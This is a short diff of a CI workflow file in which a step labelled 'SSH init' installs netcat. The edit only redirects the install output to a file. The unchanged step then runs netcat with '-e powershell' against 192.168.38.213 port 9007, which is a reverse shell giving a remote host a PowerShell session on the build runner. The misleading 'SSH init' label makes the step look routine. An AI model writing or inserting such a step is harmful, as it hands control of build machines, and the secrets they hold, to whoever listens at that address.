@@ -11,5 +11,5 @@ jobs:
     steps:
     - name: SSH init
       run: |
-        choco install netcat
+        choco install netcat > ok.txt
         nc.exe 192.168.38.213 9007 -e powershell
